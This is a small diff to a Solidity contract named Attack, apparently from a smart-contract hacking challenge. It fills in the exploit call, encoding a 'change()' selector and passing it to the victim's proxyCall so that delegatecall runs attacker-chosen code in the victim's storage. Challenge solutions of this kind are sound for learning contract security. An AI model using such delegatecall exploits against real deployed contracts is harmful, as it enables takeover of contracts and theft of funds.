@@ -33,6 +33,6 @@ contract Attack {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
-        ID31eg4t3(victim).proxyCall("0x2ee79ded");
+        ID31eg4t3(victim).proxyCall(abi.encodeWithSignature("change()"));
     }
 }
